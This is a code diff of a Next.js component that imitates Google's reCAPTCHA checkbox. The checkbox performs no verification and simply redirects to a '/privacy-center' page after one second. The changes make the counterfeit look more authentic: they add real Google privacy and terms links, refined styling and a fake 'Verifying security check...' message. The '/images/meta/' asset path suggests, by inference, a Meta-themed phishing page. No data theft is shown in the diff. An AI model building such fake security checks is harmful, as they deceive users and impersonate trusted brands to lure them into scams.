@@ -5,22 +5,17 @@ import { useRouter } from 'next/navigation'
 
 const ReCaptcha = () => {
     const [isChecked, setIsChecked] = React.useState(false);
+    const [isVerifying, setIsVerifying] = React.useState(false);
     const router = useRouter()
 
     const handleCheckboxClick = (e: React.ChangeEvent<HTMLInputElement>) => {
-        if (e.target.checked) {
+        if (e.target.checked && !isVerifying) {
             setIsChecked(true);
+            setIsVerifying(true);
             setTimeout(() => {
                 router.push("/privacy-center")
             }, 1000);
         }
-    };
-
-    const handleLabelClick = () => {
-        setIsChecked(true);
-        setTimeout(() => {
-            router.push("/privacy-center")
-        }, 1000);
     };
 
     return (
@@ -31,30 +26,37 @@ const ReCaptcha = () => {
                 </div>
 
                 <div className='flex items-center justify-start bg-cover bg-center py-5 w-full font-helvetica'>
-                    <div className="bg-[#f9f9f9] border-2 rounded-md text-[#4c4a4b] flex flex-row items-center justify-between pr-2 w-full">
-                        <div className="flex flex-row items-center justify-start ml-[1rem]">
-                            <div className='relative w-[30px] h-[30px] flex items-center justify-center'>
-                                <label className="checkbox path flex items-center justify-center" onClick={handleLabelClick}>
+                    <div className="w-full rounded-[12px] border border-[#d7dde8] bg-[#fbfcfe] px-[12px] py-[10px] shadow-[0_6px_18px_rgba(16,24,40,0.06)]">
+                        <div className="flex flex-row items-center justify-between">
+                            <div className="flex flex-row items-center justify-start">
+                                <label className="checkbox path flex items-center justify-center">
                                     <input
                                         type="checkbox"
                                         checked={isChecked}
                                         id='checked-capcha'
                                         onChange={handleCheckboxClick}
+                                        disabled={isVerifying}
+                                        aria-label='I am not a robot'
                                     />
                                     <svg viewBox="0 0 21 21">
                                         <path d="M5,10.75 L8.5,14.25 L19.4,2.3 C18.8333333,1.43333333 18.0333333,1 17,1 L4,1 C2.35,1 1,2.35 1,4 L1,17 C1,18.65 2.35,20 4,20 L17,20 C18.65,20 20,18.65 20,17 L20,7.99769186"></path>
                                     </svg>
                                 </label>
+                                <label htmlFor='checked-capcha' className="ml-[10px] cursor-pointer text-[14px] text-[#1f2937] font-semibold tracking-normal">
+                                    I&apos;m not a robot
+                                </label>
                             </div>
-                            <label htmlFor='checked-capcha' className="cursor-pointer text-[14px] text-gray-500 font-semibold mr-4 ml-1 text-center text-left tracking-normal">
-                                I’m not a robot
-                            </label>
+                            <div className="flex items-center flex-col text-[#8b93a6] mb-[2px]">
+                                <img src="/images/meta/recaptcha.png" alt="recaptcha" className="w-[40px] h-[40px] mt-[.2rem]" />
+                                <span className="text-[10px] font-bold">reCAPTCHA</span>
+                                <div className="text-[8px]">
+                                    <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
+                                    <span> - </span>
+                                    <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
+                                </div>
+                            </div>
                         </div>
-                        <div className="flex items-center flex-col text-[#9d9ba7] mb-[2px]">
-                            <img src="/images/meta/recaptcha.png" alt="recaptcha" className="w-[40px] h-[40px] mt-[.5rem]" />
-                            <span className="text-[10px] font-bold">reCAPTCHA</span>
-                            <div className="text-[8px]">Privacy - Terms</div>
-                        </div>
+                        <p className="mt-[6px] text-[11px] text-[#667085]">{isVerifying ? 'Verifying security check...' : 'Complete this security step to continue.'}</p>
                     </div>
                 </div>
 
